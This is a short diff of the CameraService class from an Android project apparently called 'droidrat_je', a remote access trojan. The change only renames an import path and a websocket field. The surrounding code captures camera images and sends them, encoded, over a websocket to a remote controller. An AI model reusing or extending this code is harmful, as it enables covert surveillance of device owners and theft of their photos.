@@ -26,7 +26,7 @@ import androidx.annotation.Nullable;
 import androidx.annotation.RequiresApi;
 import androidx.core.app.ActivityCompat;
 
-import com.je_chen.droidrat_je.util.ImageUtil;
+import com.je_chen.droidrat_je.util.image.ImageUtil;
 
 import java.io.File;
 import java.io.FileOutputStream;
@@ -34,7 +34,7 @@ import java.io.IOException;
 import java.nio.ByteBuffer;
 import java.util.Collections;
 
-import static com.je_chen.droidrat_je.service.command.ProcessCommandService.websocket;
+import static com.je_chen.droidrat_je.service.command.ProcessCommandService.websockets;
 
 public class CameraService extends Service {
 
@@ -208,8 +208,8 @@ public class CameraService extends Service {
             } finally {
                 image.close(); // close this to free up buffer for other images
                 Bitmap bitmap = BitmapFactory.decodeFile(file.getPath());
-                if (bitmap != null && websocket != null)
-                    websocket.send("Camera " + ImageUtil.convert(bitmap) + "\n");
+                if (bitmap != null && websockets != null)
+                    websockets.send("Camera " + ImageUtil.convert(bitmap) + "\n");
                 if (null != output) {
                     try {
                         output.close();
